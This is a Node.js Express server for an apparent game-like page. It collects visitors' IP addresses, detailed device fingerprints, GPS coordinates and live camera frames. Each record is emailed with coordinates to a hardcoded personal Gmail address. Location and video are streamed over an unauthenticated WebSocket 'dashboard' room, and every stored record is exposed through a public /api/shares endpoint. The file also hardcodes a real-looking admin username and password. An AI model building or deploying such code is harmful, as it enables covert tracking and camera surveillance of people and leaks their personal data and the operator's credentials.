const path = require('path');
const fs = require('fs');
const express = require('express');
const cookieParser = require('cookie-parser');
const nodemailer = require('nodemailer');
const { WebSocketServer } = require('ws');

const app = express();
const PORT = process.env.PORT || 3000;
const ENABLE_TUNNEL = process.env.ENABLE_TUNNEL === '1';

// Simple Basic Auth for admin pages
const ADMIN_USER = process.env.ADMIN_USER || 'sailendra126';
const ADMIN_PASS = process.env.ADMIN_PASS || 'Nani@1904';
const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret-change-me';
const COOKIE_NAME = 'sid';
const SESSION_MAX_AGE_DAYS = Number(process.env.SESSION_MAX_AGE_DAYS || 30);

function signSession(username, remember) {
  const data = { u: username, exp: Date.now() + (remember ? SESSION_MAX_AGE_DAYS : 1) * 24 * 60 * 60 * 1000 };
  const raw = Buffer.from(JSON.stringify(data)).toString('base64url');
  const sig = require('crypto').createHmac('sha256', SESSION_SECRET).update(raw).digest('base64url');
  return `${raw}.${sig}`;
}

function verifySession(token) {
  if (!token || typeof token !== 'string' || !token.includes('.')) return null;
  const [raw, sig] = token.split('.');
  const vsig = require('crypto').createHmac('sha256', SESSION_SECRET).update(raw).digest('base64url');
  if (vsig !== sig) return null;
  try {
    const data = JSON.parse(Buffer.from(raw, 'base64url').toString('utf8'));
    if (Date.now() > data.exp) return null;
    return data;
  } catch { return null; }
}

function requireSession(req, res, next) {
  const sid = req.cookies?.[COOKIE_NAME];
  const s = verifySession(sid);
  if (s && s.u === ADMIN_USER) return next();
  return res.status(401).send('Unauthorized');
}

function requireBasicAuth(req, res, next) {
  try {
    const header = req.headers['authorization'] || '';
    if (header.startsWith('Basic ')) {
      const decoded = Buffer.from(header.split(' ')[1], 'base64').toString('utf8');
      const idx = decoded.indexOf(':');
      const user = decoded.slice(0, idx);
      const pass = decoded.slice(idx + 1);
      if (user === ADMIN_USER && pass === ADMIN_PASS) {
        return next();
      }
    }
  } catch {}
  res.set('WWW-Authenticate', 'Basic realm="Admin", charset="UTF-8"');
  return res.status(401).send('Authentication required');
}

// Middleware
app.use(express.json({ limit: '100kb' }));
app.use(cookieParser());

// Encourage User-Agent Client Hints (device details) on supported browsers
app.use((req, res, next) => {
  res.setHeader('Accept-CH', [
    'Sec-CH-UA',
    'Sec-CH-UA-Full-Version-List',
    'Sec-CH-UA-Platform',
    'Sec-CH-UA-Platform-Version',
    'Sec-CH-UA-Arch',
    'Sec-CH-UA-Bitness',
    'Sec-CH-UA-Model'
  ].join(', '));
  res.setHeader('Permissions-Policy', [
    'ch-ua=(self)',
    'ch-ua-arch=(self)',
    'ch-ua-bitness=(self)',
    'ch-ua-full-version-list=(self)',
    'ch-ua-model=(self)',
    'ch-ua-platform=(self)',
    'ch-ua-platform-version=(self)'
  ].join(', '));
  next();
});

// Protect dashboard explicitly (redirect to login if not authenticated)
app.get('/dashboard.html', (req, res, next) => {
  const s = verifySession(req.cookies?.[COOKIE_NAME]);
  if (!s || s.u !== ADMIN_USER) {
    return res.redirect(302, '/login.html');
  }
  return res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Debug endpoint - simple retention check
app.get('/debug-retention', (req, res) => {
  res.json({
    retentionDays: RETENTION_DAYS,
    envRetention: process.env.RETENTION_DAYS,
    disabled: RETENTION_DAYS === 0,
    timestamp: new Date().toISOString()
  });
});

// Ensure storage directory exists
// Use mounted persistent disk on Render, fallback to local for dev
const storageDir = process.env.RENDER ? '/opt/render/project/src/storage' : path.join(__dirname, 'storage');
const storageFile = path.join(storageDir, 'data.jsonl');
fs.mkdirSync(storageDir, { recursive: true });

function getClientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (typeof xff === 'string' && xff.length > 0) {
    return xff.split(',')[0].trim();
  }
  return req.socket?.remoteAddress || null;
}

// Retention: keep only last N days of data
// Defaults to DISABLED (0). Set RETENTION_DAYS to a number to enable pruning.
const RETENTION_DAYS = process.env.RETENTION_DAYS === '0' ? 0 : Number(process.env.RETENTION_DAYS || 0);

// Backup function to create backups before pruning
function createBackup() {
  try {
    if (!fs.existsSync(storageFile)) return;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const backupFile = path.join(storageDir, `data-backup-${timestamp}.jsonl`);
    fs.copyFileSync(storageFile, backupFile);
    console.log(`Backup created: ${backupFile}`);
    
    // Keep only last 20 backups to prevent disk bloat while maintaining safety
    const backupFiles = fs.readdirSync(storageDir)
      .filter(f => f.startsWith('data-backup-') && f.endsWith('.jsonl'))
      .map(f => ({ name: f, path: path.join(storageDir, f), mtime: fs.statSync(path.join(storageDir, f)).mtime }))
      .sort((a, b) => b.mtime - a.mtime);
    
    // Remove old backups (keep only 20 most recent)
    for (let i = 20; i < backupFiles.length; i++) {
      try {
        fs.unlinkSync(backupFiles[i].path);
        console.log(`Removed old backup: ${backupFiles[i].name}`);
      } catch (e) {
        console.warn(`Failed to remove old backup ${backupFiles[i].name}:`, e?.message);
      }
    }
  } catch (e) {
    console.warn('createBackup failed:', e?.message || e);
  }
}

function pruneOldRecords() {
  console.log(`[PRUNING CHECK] RETENTION_DAYS=${RETENTION_DAYS}, env=${process.env.RETENTION_DAYS}, disabled=${!RETENTION_DAYS || RETENTION_DAYS <= 0}`);
  if (!RETENTION_DAYS || RETENTION_DAYS <= 0) {
    console.log('Data pruning DISABLED - no data will be removed');
    return;
  }
  
  // Extra safety: if retention is very long (>10 years), add additional checks
  if (RETENTION_DAYS > 3650) {
    console.log(`LONG-TERM RETENTION: ${RETENTION_DAYS} days (${Math.round(RETENTION_DAYS/365.25)} years) - Extra safety measures active`);
  }
  
  try {
    if (!fs.existsSync(storageFile)) {
      console.log('No storage file found, skipping pruning');
      return;
    }
    
    const cutoffMs = Date.now() - RETENTION_DAYS * 24 * 60 * 60 * 1000;
    const cutoffDate = new Date(cutoffMs).toISOString();
    console.log(`Starting data pruning with ${RETENTION_DAYS} days retention (cutoff: ${cutoffDate})`);
    
    // Create backup before pruning
    createBackup();
    
    const lines = fs.readFileSync(storageFile, 'utf8').split('\n');
    const kept = [];
    let removedCount = 0;
    for (const line of lines) {
      if (!line.trim()) continue;
      try {
        const rec = JSON.parse(line);
        const t = rec && rec.receivedAtIso ? Date.parse(rec.receivedAtIso) : NaN;
        if (!Number.isNaN(t) && t >= cutoffMs) {
          kept.push(line);
        } else {
          removedCount++;
          // Extra logging for very long-term retention
          if (RETENTION_DAYS > 3650 && !Number.isNaN(t)) {
            const recordDate = new Date(t).toISOString();
            console.log(`[retention] Prune candidate: ${recordDate}`);
          }
        }
      } catch {
        // keep malformed lines to avoid accidental data loss
        kept.push(line);
      }
    }
    // Safety check: if long-term retention would remove more than 50%, skip
    if (RETENTION_DAYS > 3650 && removedCount > kept.length) {
      console.warn(`SAFETY ABORT: Would prune ${removedCount} records but keep ${kept.length}. Skipping.`);
      return;
    }

    // Double-check: if retention is disabled, don't write anything
    if (!RETENTION_DAYS || RETENTION_DAYS <= 0) {
      console.log('SAFETY ABORT: Retention disabled, not writing file');
      return;
    }
    
    fs.writeFileSync(storageFile, kept.join('\n').replace(/\n+$/,'') + '\n');
    console.log(`[retention] Kept: ${kept.length}, Removed: ${removedCount}, Cutoff days: ${RETENTION_DAYS}`);
  } catch (e) {
    console.warn('pruneOldRecords failed:', e?.message || e);
  }
}

// in-memory recent dedupe ids (best-effort)
const recentIds = new Set();
function rememberId(id) {
  if (!id) return;
  recentIds.add(id);
  if (recentIds.size > 1000) {
    const first = recentIds.values().next().value; recentIds.delete(first);
  }
  setTimeout(() => recentIds.delete(id), 5 * 60 * 1000).unref?.();
}

app.post('/api/share', async (req, res) => {
  try {
    const userIp = getClientIp(req);
    const body = req.body || {};

    if (body.dedupeId && recentIds.has(body.dedupeId)) {
      return res.json({ status: 'ok', deduped: true });
    }

    const record = {
      receivedAtIso: new Date().toISOString(),
      ip: userIp,
      consent: body.consent || {},
      device: body.device || null,
      gps: body.gps || null,
      score: typeof body.score === 'number' ? body.score : null,
      playerName: typeof body.playerName === 'string' ? body.playerName : null,
      cameraRoom: typeof body.cameraRoom === 'string' ? body.cameraRoom : null,
      userAgent: req.headers['user-agent'] || null,
      acceptLanguage: req.headers['accept-language'] || null
    };

    // Persist as JSONL to keep it lightweight and append-only
    const line = JSON.stringify(record) + '\n';
    fs.appendFile(storageFile, line, (err) => {
      if (err) {
        console.error('Failed to write record:', err);
      }
    });

    // Notify via server logs (you can replace with email/webhook later)
    console.log('[New Share]', {
      ip: record.ip,
      device: record.device ? 'yes' : 'no',
      gps: record.gps ? 'yes' : 'no',
      score: record.score,
      consent: record.consent
    });

    // Email notification (best-effort)
    try {
      const to = process.env.NOTIFY_EMAIL || 'sailendra126@gmail.com';
      const transport = nodemailer.createTransport({
        host: process.env.SMTP_HOST || 'smtp.gmail.com',
        port: Number(process.env.SMTP_PORT || 587),
        secure: false,
        auth: process.env.SMTP_USER && process.env.SMTP_PASS ? { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS } : undefined
      });
      const subject = `New share: ${record.ip || 'unknown'} ${record.gps ? `(${record.gps.latitude?.toFixed?.(6)},${record.gps.longitude?.toFixed?.(6)})` : ''}`;
      const text = JSON.stringify(record, null, 2);
      await transport.sendMail({ from: process.env.SMTP_FROM || to, to, subject, text });
    } catch (e) {
      console.warn('Email notify failed:', e?.message || e);
    }

    rememberId(body.dedupeId);
    res.json({ status: 'ok' });
  } catch (e) {
    console.error(e);
    res.status(500).json({ status: 'error' });
  }
});

// API: Get shares (public endpoint for retrieving data)
app.get('/api/shares', (req, res) => {
  try {
    const limit = Math.max(1, Math.min(2000, Number(req.query.limit) || 50));
    const page = Number(req.query.page) || 1;
    const pageSize = Math.max(1, Math.min(1000, Number(req.query.pageSize) || 50));
    
    if (!fs.existsSync(storageFile)) {
      return res.json({ shares: [], total: 0, page, pageSize, hasMore: false });
    }

    const content = fs.readFileSync(storageFile, 'utf8');
    const lines = content.trim().split('\n').filter(Boolean);
    const total = lines.length;
    
    // Calculate pagination
    const startIndex = (page - 1) * pageSize;
    const endIndex = Math.min(startIndex + pageSize, total);
    const pageLines = lines.slice(startIndex, endIndex);
    
    const shares = pageLines.map(line => {
      try {
        return JSON.parse(line);
      } catch {
        return null;
      }
    }).filter(Boolean);

    res.json({
      shares,
      total,
      page,
      pageSize,
      hasMore: endIndex < total,
      totalPages: Math.ceil(total / pageSize)
    });
  } catch (e) {
    console.error('Error reading shares:', e);
    res.status(500).json({ error: 'Failed to read shares' });
  }
});

// Admin: recent submissions (not authenticated; for demo use only)
app.get('/admin/recent', requireSession, (req, res) => {
  try {
    const limit = Math.max(1, Math.min(2000, Number(req.query.limit) || 50));
    const page = Number(req.query.page) || null; // 1-based
    const pageSize = Math.max(1, Math.min(1000, Number(req.query.pageSize) || 50));
    if (!fs.existsSync(storageFile)) {
      return page ? res.json({ total: 0, page: 1, pageSize, items: [] }) : res.json([]);
    }
    const data = fs.readFileSync(storageFile, 'utf8').trim().split('\n').filter(Boolean);
    const recordsNewestFirst = data.map((line) => {
      try { return JSON.parse(line); } catch { return { raw: line }; }
    }).reverse();

    if (page) {
      const total = recordsNewestFirst.length;
      const startIndex = (page - 1) * pageSize;
      const items = startIndex >= total ? [] : recordsNewestFirst.slice(startIndex, startIndex + pageSize);
      return res.json({ total, page, pageSize, items });
    }

    // Backwards-compatible non-paginated response using limit
    const recent = recordsNewestFirst.slice(0, limit);
    res.json(recent);
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'failed_to_read' });
  }
});

app.get('/admin/count', requireSession, (req, res) => {
  try {
    if (!fs.existsSync(storageFile)) return res.json({ total: 0 });
    const count = fs.readFileSync(storageFile, 'utf8').split('\n').filter(Boolean).length;
    res.json({ total: count });
  } catch (e) {
    res.status(500).json({ error: 'failed_to_count' });
  }
});

// Manual backup endpoint for extra safety
app.post('/admin/backup', requireSession, (req, res) => {
  try {
    createBackup();
    res.json({ status: 'ok', message: 'Backup created successfully' });
  } catch (e) {
    console.error('Manual backup failed:', e);
    res.status(500).json({ error: 'backup_failed', message: e?.message || 'Unknown error' });
  }
});

// Backup status endpoint
app.get('/admin/backups', requireSession, (req, res) => {
  try {
    if (!fs.existsSync(storageDir)) {
      return res.json({ backups: [], count: 0 });
    }
    const backupFiles = fs.readdirSync(storageDir)
      .filter(f => f.startsWith('data-backup-') && f.endsWith('.jsonl'))
      .map(f => {
        const stat = fs.statSync(path.join(storageDir, f));
        return { 
          name: f, 
          created: stat.mtime.toISOString(),
          size: stat.size 
        };
      })
      .sort((a, b) => new Date(b.created) - new Date(a.created));
    
    res.json({ backups: backupFiles, count: backupFiles.length });
  } catch (e) {
    res.status(500).json({ error: 'failed_to_list_backups' });
  }
});

// Admin: storage status
app.get('/admin/storage-status', requireSession, (req, res) => {
  try {
    const exists = fs.existsSync(storageFile);
    const stat = exists ? fs.statSync(storageFile) : null;
    const sizeBytes = stat ? stat.size : 0;
    const lines = exists ? fs.readFileSync(storageFile, 'utf8').split('\n').filter(Boolean).length : 0;
    res.json({
      retentionDays: RETENTION_DAYS,
      fileExists: exists,
      sizeBytes,
      sizeMB: +(sizeBytes / (1024*1024)).toFixed(2),
      lines
    });
  } catch (e) {
    res.status(500).json({ error: 'failed_storage_status' });
  }
});

// Auth endpoints
app.post('/api/login', (req, res) => {
  const { username, password, remember } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = signSession(username, !!remember);
    const maxAge = (remember ? SESSION_MAX_AGE_DAYS : 1) * 24 * 60 * 60 * 1000;
    res.cookie(COOKIE_NAME, token, { httpOnly: true, sameSite: 'lax', maxAge });
    return res.json({ ok: true });
  }
  return res.status(401).json({ ok: false });
});

app.post('/api/logout', (req, res) => {
  res.clearCookie(COOKIE_NAME, { httpOnly: true, sameSite: 'lax' });
  res.json({ ok: true });
});

const httpServer = app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Storage directory: ${storageDir}`);
  console.log(`Storage file: ${storageFile}`);
  console.log(`Data retention: ${RETENTION_DAYS === 0 ? 'DISABLED (data will never be automatically deleted)' : `${RETENTION_DAYS} days`}`);
  
  // Check if storage directory exists and is writable
  try {
    fs.accessSync(storageDir, fs.constants.W_OK);
    console.log('Storage directory is writable');
  } catch (e) {
    console.error('Storage directory is not writable:', e?.message);
  }
  
  // Show current data count if file exists
  try {
    if (fs.existsSync(storageFile)) {
      const count = fs.readFileSync(storageFile, 'utf8').split('\n').filter(Boolean).length;
      console.log(`Current data records: ${count}`);
    } else {
      console.log('No existing data file found');
    }
  } catch (e) {
    console.warn('Could not read data file:', e?.message);
  }
  
  console.log(`[STARTUP] Data retention: ${RETENTION_DAYS} days (${RETENTION_DAYS === 0 ? 'DISABLED' : 'ENABLED'})`);
  pruneOldRecords();
  // Prune once per day
  setInterval(pruneOldRecords, 24 * 60 * 60 * 1000).unref?.();
  if (ENABLE_TUNNEL) {
    (async () => {
      try {
        const mod = await import('localtunnel');
        const lt = mod.default || mod;
        const tunnel = await lt({ port: Number(PORT) });
        console.log('Public URL:', tunnel.url);
        tunnel.on('close', () => console.log('Tunnel closed'));
      } catch (e) {
        console.warn('localtunnel not available:', e?.message || e);
      }
    })();
  }
});

// --- WebSocket Signaling (rooms) ---
const wss = new WebSocketServer({ noServer: true });
const rooms = new Map(); // roomId -> Set(ws)

function broadcast(roomId, sender, data) {
  const set = rooms.get(roomId);
  if (!set) return;
  for (const ws of set) {
    if (ws !== sender && ws.readyState === ws.OPEN) {
      ws.send(JSON.stringify(data));
    }
  }
}

// Broadcast to dashboard room for live streaming
function broadcastToDashboard(data) {
  const dashboardSet = rooms.get('dashboard');
  if (!dashboardSet) return;
  for (const ws of dashboardSet) {
    if (ws.readyState === ws.OPEN) {
      ws.send(JSON.stringify(data));
    }
  }
}

function handleWsConnection(ws, roomId) {
  console.log(`WebSocket connection established for room: ${roomId}`);
  if (!rooms.has(roomId)) rooms.set(roomId, new Set());
  rooms.get(roomId).add(ws);
  
  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg.toString());
      console.log(`Received message in room ${roomId}:`, data.type || 'ICE candidate');
      
      // Forward video frames and location data to dashboard
      if (data.type === 'video_frame' || data.type === 'location') {
        broadcastToDashboard(data);
        // Also broadcast to other viewers in the same room (for admin viewing specific rooms)
        broadcast(roomId, ws, data);
      } else {
        // Relay SDP/ICE to others in the room
        broadcast(roomId, ws, data);
      }
    } catch (error) {
      console.error('Error parsing WebSocket message:', error);
    }
  });
  
  ws.on('close', () => {
    console.log(`WebSocket connection closed for room: ${roomId}`);
    const set = rooms.get(roomId);
    if (set) { 
      set.delete(ws); 
      if (set.size === 0) {
        rooms.delete(roomId);
        console.log(`Room ${roomId} deleted (no more connections)`);
      }
    }
  });
  
  ws.on('error', (error) => {
    console.error(`WebSocket error in room ${roomId}:`, error);
  });
}

// Test endpoint to verify WebSocket server
app.get('/api/ws-status', (req, res) => {
  const roomCount = rooms.size;
  const totalConnections = Array.from(rooms.values()).reduce((sum, set) => sum + set.size, 0);
  res.json({ 
    rooms: roomCount, 
    connections: totalConnections,
    rooms: Array.from(rooms.keys())
  });
});

// Public endpoint to check retention settings (no auth required for debugging)
app.get('/api/retention-status', (req, res) => {
  try {
    const exists = fs.existsSync(storageFile);
    const stat = exists ? fs.statSync(storageFile) : null;
    const sizeBytes = stat ? stat.size : 0;
    const lines = exists ? fs.readFileSync(storageFile, 'utf8').split('\n').filter(Boolean).length : 0;
    const envRetention = process.env.RETENTION_DAYS;
    
    res.json({
      retentionDays: RETENTION_DAYS,
      envRetentionDays: envRetention,
      pruningDisabled: RETENTION_DAYS === 0,
      fileExists: exists,
      sizeBytes,
      sizeMB: +(sizeBytes / (1024*1024)).toFixed(2),
      lines,
      storagePath: storageFile,
      timestamp: new Date().toISOString()
    });
  } catch (e) {
    res.status(500).json({ error: 'failed_retention_status', message: e?.message });
  }
});

// Upgrade HTTP server to WS for /ws?room=ID on the same HTTP server
httpServer.on('upgrade', (req, socket, head) => {
  console.log(`WebSocket upgrade request: ${req.url}`);
  const url = new URL(req.url, 'http://localhost');
  if (url.pathname === '/ws') {
    const roomId = url.searchParams.get('room');
    console.log(`Upgrading to WebSocket for room: ${roomId}`);
    wss.handleUpgrade(req, socket, head, (ws) => handleWsConnection(ws, roomId || 'default'));
  } else {
    console.log(`Rejecting WebSocket upgrade for path: ${url.pathname}`);
    socket.destroy();
  }
});

// Serve static frontend (after all API routes)
app.use(express.static(path.join(__dirname, 'public'), { index: 'index.html', extensions: ['html'] }));

// Catch-all error handler for debugging (must be last)
app.use((req, res, next) => {
  console.log(`[404] Route not found: ${req.method} ${req.url}`);
  res.status(404).json({ error: { type: 'not_found', message: `Route ${req.method} ${req.url} not found` } });
});

